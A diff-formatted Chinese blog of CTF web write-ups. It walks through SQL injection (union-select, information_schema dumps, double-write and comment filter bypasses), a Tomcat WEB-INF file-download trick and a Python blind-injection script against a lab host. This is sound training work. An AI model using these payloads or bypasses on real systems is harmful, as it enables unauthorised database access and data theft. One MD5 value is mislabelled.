+<ol start="6">
+<li>寻找l0ve1ysq1的字段名</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=1&#x27; union select 1,database(),group_concat(column_name) from information_schema.columns where table_name=&#x27;l0ve1ysq1&#x27;%23&amp;password=ads</span><br></pre></td></tr></table></figure>
+
+<p>​	返回：Your password is ‘id,username,password’</p>
+<p>​	说明字段名：id,username,password</p>
+<p>7.寻找l0ve1ysq1表的id,username,password三个字段</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=1&#x27; union select 1,database(),group_concat(id,username,password) from l0ve1ysq1%23&amp;password=ads</span><br></pre></td></tr></table></figure>
+
+<p>​	得到：Your password is  ‘1cl4ywo_tai_nan_le,2glzjinglzjin_wants_a_girlfriend,3Z4cHAr7zCrbiao_ge_dddd_hm,40xC4m3llinux_chuang_shi_ren,5Ayraina_rua_rain,6Akkoyan_shi_fu_de_mao_bo_he,7fouc5cl4y,8fouc5di_2_kuai_fu_ji,9fouc5di_3_kuai_fu_ji,10fouc5di_4_kuai_fu_ji,11fouc5di_5_kuai_fu_ji,12fouc5di_6_kuai_fu_ji,13fouc5di_7_kuai_fu_ji,14fouc5di_8_kuai_fu_ji,15leixiaoSyc_san_da_hacker,16flagflag{7a23d0ab-def9-4f32-bd55-8e4155655f17}’</p>
+<p>​	说明：flag{7a23d0ab-def9-4f32-bd55-8e4155655f17}</p>
+<h2 id="RoarCTF-2019-Easy-Java1题解"><a href="#RoarCTF-2019-Easy-Java1题解" class="headerlink" title="[RoarCTF 2019]Easy Java1题解"></a><strong>[RoarCTF 2019]Easy Java1</strong>题解</h2><p>1.又是账号密码登陆，没有头绪，用sql失败，看到下面help</p>
+<p>java.io.FileNotFoundException:{help.docx}；</p>
+<p>说明是个可下载文件，但当前get不行，用post试试</p>
+<p>2.下载文件，发现无可用信息</p>
+<p>3.看到 filename&#x3D;参数 ，用之前说的穿越目录，发现不可以</p>
+<p>4.看到页面有tomcat，说明服务器了</p>
+<p>试试：filename&#x3D;WEB-INF&#x2F;web.xml</p>
+<p>为什么？</p>
+<p><code>WEB-INF/web.xml</code> </p>
+<ol>
+<li><p>科普：</p>
+<p>WEB-INF&#x2F; </p>
+<p>目录是每个 Web 应用中必须存在的目录，包含一些配置信息，不会被直接暴露给客户端访问。</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"> WEB-<span class="meta">INF</span>主要包含以下文件或目录：</span><br><span class="line"> </span><br><span class="line">/WEB-<span class="meta">INF</span>/web<span class="number">.</span>xml：</span><br><span class="line">是 Tomcat 网站的「核心说明书」，藏着找 Flag 的关键线索，CTF 里碰到 Tomcat 任意文件下载漏洞，必查它！</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">/WEB-<span class="meta">INF</span>/classes/：</span><br><span class="line">含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中</span><br><span class="line"></span><br><span class="line">/WEB-<span class="meta">INF</span>/lib/：</span><br><span class="line">用于存放 Web 应用所依赖的 JAR 包。</span><br><span class="line"></span><br><span class="line">/WEB-<span class="meta">INF</span>/src/：</span><br><span class="line">源码目录，按照包名结构放置各个java文件。</span><br><span class="line"></span><br><span class="line">/WEB-<span class="meta">INF</span>/database<span class="number">.</span>properties：</span><br><span class="line">数据库配置文件</span><br></pre></td></tr></table></figure></li>
+</ol>
+<p>得到：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">welcome-file-list</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">welcome-file</span>&gt;</span>Index<span class="tag">&lt;/<span class="name">welcome-file</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">welcome-file-list</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>IndexController<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>com.wm.ctf.IndexController<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">        。。。。。</span><br><span class="line"> <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>FlagController<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/Flag<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span>        </span><br></pre></td></tr></table></figure>
+
+<p>推出：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/Flag`对应的路径为`/WEB-INF/classes/com/wm/ctf/FlagController.class</span><br></pre></td></tr></table></figure>
+
+<p>4.filename&#x3D;WEB-INF&#x2F;classes&#x2F;com&#x2F;wm&#x2F;ctf&#x2F;FlagController.class文件，发现flag，解码</p>
+<p>（末尾 &#x3D; &#x3D; 知道是base64）</p>
+<h4 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h4><table>
+<thead>
+<tr>
+<th>咒语（符号）</th>
+<th>作用</th>
+<th>举例</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>.</code>（点）</td>
+<td>匹配 “任意一个字符”（比如汉字、数字、字母，除了换行）</td>
+<td>咒语 “a.c” 能找到 “abc”“a1c”“a 好 c”（中间随便啥都行）</td>
+</tr>
+<tr>
+<td><code>^</code>（尖尖）</td>
+<td>匹配 “字符串开头”</td>
+<td>咒语 “^flag” 能找到 “flag123”“flag {abc}”（必须以 flag 开头），找不到 “123flag”</td>
+</tr>
+<tr>
+<td><code>$</code>（美元符）</td>
+<td>匹配 “字符串结尾”</td>
+<td>咒语 “}”$ 能找到 “abc}”“flag {123}”（必须以} 结尾），找不到 “} 123”</td>
+</tr>
+<tr>
+<td><code>*</code>（星号）</td>
+<td>前面的字符 “可以有 0 个或多个”</td>
+<td>咒语 “a*b” 能找到 “b”（a 有 0 个）、“ab”（a 有 1 个）、“aaab”（a 有 3 个）</td>
+</tr>
+<tr>
+<td><code>+</code>（加号）</td>
+<td>前面的字符 “必须有 1 个或多个”</td>
+<td>咒语 “a+b” 能找到 “ab”“aaab”（a 至少 1 个），找不到 “b”（a 有 0 个）</td>
+</tr>
+<tr>
+<td><code>[]</code>（方括号）</td>
+<td>匹配 “方括号里的任意一个”</td>
+<td>咒语 “[123]” 能找到 “1”“2”“3”；咒语 “[a-z]” 能找到所有小写字母（a 到 z）</td>
+</tr>
+<tr>
+<td><code>[^]</code>（方括号 + 尖尖）</td>
+<td>匹配 “不在方括号里的任意一个”</td>
+<td>咒语 <code>“[^0-9]” </code>能找到所有不是数字的字符（比如字母、符号）</td>
+</tr>
+<tr>
+<td><code>\d</code>（d 小写）</td>
+<td>专门匹配 “数字”（0-9）</td>
+<td>咒语 “\d\d” 能找到 “12”“34”（两个数字），相当于 “[0-9][0-9]”</td>
+</tr>
+<tr>
+<td><code>\w</code>（w 小写）</td>
+<td>专门匹配 “字母、数字、下划线”</td>
+<td>咒语 “\w” 能找到 “a”“5”“_”，找不到 “！”“@”</td>
+</tr>
+</tbody></table>
+<h4 id="1-找-flag（最常用！）"><a href="#1-找-flag（最常用！）" class="headerlink" title="1. 找 flag（最常用！）"></a>1. 找 flag（最常用！）</h4><ul>
+<li><p>正则咒语：<code>flag\{.*?\}</code>（念法：flag 左大括号，任意字符少少的，右大括号）；</p>
+</li>
+<li><p>原理：</p>
+<ul>
+<li><p><code>flag\{</code>：先找到 “flag {”（大括号要加 \，因为大括号是特殊咒语，得 “转义” 一下，告诉正则 “我就是要找大括号”）；</p>
+</li>
+<li><p><code>.*?</code>：<code>.*</code> 会尽可能多地吃字符,？）；</p>
+<p>​      <code>？</code>意味吃到第一个就停</p>
+</li>
+<li><p><code>\}</code>：最后找到 “}”；</p>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="2-绕限制（Web-题常用）"><a href="#2-绕限制（Web-题常用）" class="headerlink" title="2. 绕限制（Web 题常用）"></a>2. 绕限制（Web 题常用）</h4><ul>
+<li><p>场景：网站不让输入 “union select”（比如 SQL 注入时），输入就被拦截（网站用正则检测这个关键词）；</p>
+</li>
+<li><p>正则咒语（网站的拦截规则）：<code>^.*union.*select.*$</code>（意思：只要包含 “union” 和 “select” 就拦截）；</p>
+<p>​               <code>^  .*  union  .*  select  .*  $</code></p>
+</li>
+<li><p>绕过方法（改你的输入，让网站的正则认不出来）：</p>
+<ul>
+<li><p>大小写混淆：输入 “Union Select”（网站的正则只认小写，这样就绕过去了）；</p>
+</li>
+<li><p>插无关字符：输入 “uni&#x2F;<strong>&#x2F;on sel&#x2F;</strong>&#x2F;ect”</p>
+<p>​        &#x2F;**&#x2F;：注释</p>
+</li>
+</ul>
+</li>
+<li><p>效果：成功输入你要的内容，实现 SQL 注入，拿到 flag！</p>
+</li>
+</ul>
+<h4 id="3-筛密码（密码破解题）"><a href="#3-筛密码（密码破解题）" class="headerlink" title="3. 筛密码（密码破解题）"></a>3. 筛密码（密码破解题）</h4><ul>
+<li>场景：题目说 “密码是 8 位以上，有大写、小写、数字、感叹号”，给你一个密码字典（一堆可能的密码），要快速找出符合条件的；</li>
+<li>正则咒语：<code>^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*!)(.{8,})$</code>；</li>
+<li>原理（简单说）：<ul>
+<li><code>(?=.*[a-z])</code>：必须有小写字母；   ?&#x3D;是<code>必须要有</code>的意思</li>
+<li><code>(?=.*[A-Z])</code>：必须有大写字母；</li>
+<li><code>(?=.*\d)</code>：必须有数字；</li>
+<li><code>(?=.*!)</code>：必须有感叹号；</li>
+<li><code>(.{8,})</code>：总长度至少 8 位；    .是任意字符</li>
+</ul>
+</li>
+<li>效果：从 1000 个密码里，秒筛出符合条件的 10 个，再逐个尝试破解！</li>
+</ul>
+<ol>
+<li><p>练习 2：找数字</p>
+<p>右边文本：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">我的QQ是123456，电话是789-0123</span><br></pre></td></tr></table></figure>
+
+
+
+<p>左边咒语：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\d&#123;6&#125;</span><br></pre></td></tr></table></figure>
+
+<p>（找 6 个连续数字）</p>
+<ul>
+<li><code>d{6}</code> → 匹配 “dddddd”；</li>
+<li><code>\d{6}</code> → 匹配 “123456”。</li>
+</ul>
+<p>效果：高亮 “123456”！</p>
+</li>
+</ol>
+<p>1.限定符</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">a* a出现0或多次</span><br><span class="line">a+ a出现1或多次</span><br><span class="line">a? a出现1或0次</span><br><span class="line">a&#123;6&#125; a出现6次</span><br><span class="line">a&#123;2,6&#125; a出现2-6次</span><br><span class="line">a&#123;2,&#125; a出现2次以上</span><br></pre></td></tr></table></figure>
+
+<p>2.运算符</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">（a|b） 匹配a或者b</span><br><span class="line">(ab)|(cd) 匹配ab</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p>1.zsteg out.png 显示每个通道的隐写信息</p>
+<p>针对png</p>
+<p>2.exiftool out.png</p>
+<p>png jpg</p>
+<p>查看图片原数据&#x2F;文件分析，找到提示</p>
+<p>comment</p>
+<p>3.binwalk </p>
+<p>分析文件，分区块，找到结构</p>
+<p>4.strings</p>
+<p>显示图片可打印字符</p>
+<h2 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h2><h3 id="1题解-2"><a href="#1题解-2" class="headerlink" title="1题解"></a>1题解</h3><p>1.万能密码（输入1’后有引号被包括在‘’内的报错，说明为字符型；输入1无报错）</p>
+<p>发现do not hack me!，说明有过滤</p>
+<p>但是得到了：</p>
+<!--MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5-->
+
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /> 
+
+<p>&lt;**title**&gt;Do you know who am I?&lt;&#x2F;**title**&gt;</p>
+<p>base32：MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5</p>
+<p>解码后的base64，在解码得：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from user where username=&#x27;$name&#x27;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>2.判断注入点</p>
+<p><strong>name</strong>&#x3D;<strong>1’</strong> <strong>union</strong> <strong>select</strong> <strong>1,2</strong>#&amp;pw&#x3D;admin</p>
+<p>试试：order by 1</p>
+<p>​		2</p>
+<p>​		3</p>
+<p>​		4出现Error: The used SELECT statements have a different number of columns</p>
+<p>说明3个注入点</p>
+<p>4.查看代码找找灵感</p>
+<p>search.php源码（<code>search.php</code>是 “用户输入 + SQL 执行” 的直接载体）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">if(preg_match(&quot;/\(|\)|\=|or/&quot;, $name))&#123;       //过滤</span><br><span class="line">	die(&quot;do not hack me!&quot;);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">	if (!$result) &#123;</span><br><span class="line">		printf(&quot;Error: %s\n&quot;, mysqli_error($con));</span><br><span class="line">		exit();</span><br><span class="line">	&#125;</span><br><span class="line">	else&#123;</span><br><span class="line">		// echo &#x27;&lt;pre&gt;&#x27;;</span><br><span class="line">		$arr = mysqli_fetch_row($result);       //$arr将经过sql查询存储在$result转换成数组的形式</span><br><span class="line">		// print_r($arr);</span><br><span class="line">		if($arr[1] == &quot;admin&quot;)&#123;           //admin</span><br><span class="line">			if(c($password) == $arr[2])&#123;      </span><br><span class="line">				echo $flag;</span><br><span class="line">			&#125;</span><br></pre></td></tr></table></figure>
+
+<p>由上：</p>
+<p>1.存在admin</p>
+<p>输入：</p>
+<p><strong>name</strong>&#x3D;<strong>1’</strong> <strong>union</strong> <strong>select</strong> <strong>1,2,’admin’</strong>#&amp;pw&#x3D;admin    **wrong user!</p>
+<p><strong>name</strong>&#x3D;<strong>1’</strong> <strong>union</strong> <strong>select</strong> <strong>1,’admin’,3</strong>#&amp;pw&#x3D;admin    wrong pass!</p>
+<p>说明：</p>
+<p>字段2、3分别对应name、password</p>
+<p>5.构造payload</p>
+<p>search.php源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$arr</span>[<span class="number">1</span>] == <span class="string">&quot;admin&quot;</span>)&#123;</span><br><span class="line">			<span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$password</span>) == <span class="variable">$arr</span>[<span class="number">2</span>])&#123;  <span class="comment">//md5加密</span></span><br><span class="line">				<span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span>&#123;</span><br><span class="line">				<span class="keyword">die</span>(<span class="string">&quot;wrong pass!&quot;</span>);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name=<span class="number">1</span><span class="string">&#x27; union select 1,&#x27;</span>admin<span class="string">&#x27;,&#x27;</span>MD5加密后的密码<span class="string">&#x27;#&amp;pw=对应密码</span></span><br></pre></td></tr></table></figure>
+
+<p>123456加密后：c4ca4238a0b923820dcc509a6f75849b（我试过大写错了）</p>
+<p>所以：name&#x3D;1’ union select 1,’admin’,’c4ca4238a0b923820dcc509a6f75849b’#&amp;pw&#x3D;1</p>
+<h2 id="极客大挑战-2019-BabySQL"><a href="#极客大挑战-2019-BabySQL" class="headerlink" title="[极客大挑战 2019]BabySQL"></a>[极客大挑战 2019]BabySQL</h2><h3 id="1-2"><a href="#1-2" class="headerlink" title="1"></a>1</h3><p>select，from，imf被过滤，要双写</p>
+<table>
+<thead>
+<tr>
+<th>原始关键词</th>
+<th>标准双写写法</th>
+<th>拆分逻辑（帮理解）</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>union</td>
+<td>ununionion</td>
+<td>un + union + ion</td>
+</tr>
+<tr>
+<td>select</td>
+<td>selselectect</td>
+<td>sel + select + ect</td>
+</tr>
+<tr>
+<td>from</td>
+<td>frfromom</td>
+<td>fr + from + om</td>
+</tr>
+<tr>
+<td>where</td>
+<td>whwhereere</td>
+<td>wh + where + ere</td>
+</tr>
+<tr>
+<td>information</td>
+<td>infoorrmation</td>
+<td>info + or + rmation（注：information 是特殊款，核心是双写中间的 or，而非完整词）</td>
+</tr>
+<tr>
+<td>schema</td>
+<td>schschemaema</td>
+<td>sch + schema + ema</td>
+</tr>
+</tbody></table>
+<ol>
+<li></li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=1&#x27; and ununionion selselectect 1,2--+&amp;password=1</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">The used SELECT statements have a different number of columns</span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li></li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=1&#x27; ununionion selselectect 1,2,3--+&amp;password=1</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Hello 2！</span><br><span class="line"></span><br><span class="line">Your password is &#x27;3&#x27; //说明回显位为2和3</span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li></li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">group_concat(table_name) from information_schema.tables where table_schema=database()</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=1&#x27; ununionion selselectect 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()--+&amp;password=1</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax;</span><br><span class="line">check the manual that corresponds to your MariaDB server version for the right syntax to use near &#x27;.tables table_schema=database()-- &#x27; and password=&#x27;1&#x27;&#x27; at line 1</span><br></pre></td></tr></table></figure>
+
+
+
+<ol start="4">
+<li></li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=1&#x27; ununionion selselectect 1,2,group_concat(schema_name) frfromom infoorrmation_schema.schemata --+&amp;password=1</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Hello 2！</span><br><span class="line">Your password is &#x27;information_schema,performance_schema,test,mysql,ctf,geek&#x27;</span><br></pre></td></tr></table></figure>
+
+<ol start="5">
+<li></li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=1&#x27; ununionion selselectect 1,2,group_concat(table_name) frfromom infoorrmation_schema.tables whwhereere table_schema=&#x27;ctf&#x27;--+&amp;password=1</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Hello 2！</span><br><span class="line">Your password is &#x27;Flag&#x27;</span><br></pre></td></tr></table></figure>
+
+
+
+<ol start="6">
+<li></li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=1&#x27; ununionion selselectect 1,2,group_concat(flag) frfromom ctf.Flag--+&amp;password=1</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+<h2 id="CISCN2019-华北赛区-Day2-Web1-Hack-World-1"><a href="#CISCN2019-华北赛区-Day2-Web1-Hack-World-1" class="headerlink" title="[CISCN2019 华北赛区 Day2 Web1]Hack World 1"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World 1</h2><h2 id="-1"><a href="#-1" class="headerlink" title=""></a></h2><p>提示：All You Want Is In Table ‘flag’ and the column is ‘flag’  </p>
+<p>Now, just give the id of passage</p>
+<p>输入1：</p>
+<p>Hello, glzjin wants a girlfriend.</p>
+<p>1.sql发现被过滤</p>
+<p>2.fezz得到基本上只要是关键字都被过滤了，改用 盲注脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line"></span><br><span class="line">def blind_injection(url):</span><br><span class="line">    flag = &#x27;&#x27;</span><br><span class="line">    strings = string.printable</span><br><span class="line">    for num in range(1,60):</span><br><span class="line">        for i in strings:</span><br><span class="line">            payload = &#x27;(select(ascii(mid(flag,&#123;0&#125;,1))=&#123;1&#125;)from(flag))&#x27;.format(num,ord(i))</span><br><span class="line">            post_data = &#123;&quot;id&quot;:payload&#125;</span><br><span class="line">            res = requests.post(url=url,data=post_data)</span><br><span class="line">            if &#x27;Hello&#x27; in res.text:</span><br><span class="line">                flag += i</span><br><span class="line">                print(flag)</span><br><span class="line">                break</span><br><span class="line">    print(flag)</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    url = &#x27;http://bba3f6f0-b4cd-4c59-941b-9d84c8300332.node5.buuoj.cn:81/index.php&#x27;</span><br><span class="line">    blind_injection(url)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 2. 定义盲注核心函数，参数url是靶场地址</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">blind_injection</span>(<span class="params">url</span>):</span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span>  <span class="comment"># 初始化空字符串，存储最终爆破出的flag</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># string.printable：包含所有可打印ASCII字符（数字、字母、符号、空格等，共100+个）</span></span><br><span class="line">    strings = string.printable  </span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 遍历flag的每一位（假设最长60位，num=1代表第1位，num=2代表第2位...）</span></span><br><span class="line">    <span class="keyword">for</span> num <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">60</span>):  </span><br><span class="line">        <span class="comment"># 遍历所有可打印字符，逐个试当前位是不是这个字符</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> strings:  </span><br><span class="line">            <span class="comment"># 核心注入payload，用format填充num（第几位）和ord(i)（字符i的ASCII码）</span></span><br><span class="line">            payload = <span class="string">&#x27;(select(ascii(mid(flag,&#123;0&#125;,1))=&#123;1&#125;)from(flag))&#x27;</span>.<span class="built_in">format</span>(num,<span class="built_in">ord</span>(i))</span><br><span class="line">            <span class="comment">#ord(i) 把这个字符转成对应的 ASCII 码（比如 &#x27;f&#x27; → 102）；</span></span><br><span class="line">            <span class="comment">#mid(要截取的字符串, 从第几位开始, 截取几个字符)</span></span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 构造POST请求的参数：id=上面的payload（靶场注入点是id参数）</span></span><br><span class="line">            post_data = &#123;<span class="string">&quot;id&quot;</span>:payload&#125;</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 发送POST请求，把payload传给靶场的id参数</span></span><br><span class="line">            res = requests.post(url=url,data=post_data)</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 关键判断：如果页面返回内容里有&quot;Hello&quot;，说明匹配成功</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;Hello&#x27;</span> <span class="keyword">in</span> res.text:  </span><br><span class="line">                flag += i  <span class="comment"># 把匹配成功的字符i拼到flag里</span></span><br><span class="line">                <span class="built_in">print</span>(flag) <span class="comment"># 实时打印当前已爆破的部分（看进度）</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">continue</span>  <span class="comment"># 没匹配到，继续试下一个字符</span></span><br><span class="line">    <span class="comment"># 循环结束后，打印完整flag</span></span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 3. 主程序入口（直接执行脚本时运行）</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># 靶场的目标URL</span></span><br><span class="line">    url = <span class="string">&#x27;http://bba3f6f0-b4cd-4c59-941b-9d84c8300332.node5.buuoj.cn:81/index.php&#x27;</span></span><br><span class="line">    <span class="comment"># 调用盲注函数，传入靶场地址开始爆破</span></span><br><span class="line">    blind_injection(url)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="moectf-16-第十六章-昆仑星途-题解"><a href="#moectf-16-第十六章-昆仑星途-题解" class="headerlink" title="moectf 16 第十六章 昆仑星途 题解"></a>moectf 16 第十六章 昆仑星途 题解</h2><p><code>data://</code>伪协议，把 URL 里的代码内容当成 “虚拟文件” 让 PHP 解析执行</p>
+<p><code>f*</code>  是<strong>通配符匹配</strong>，平常如果不知道 flag 文件的完整名称可以用（linux）</p>
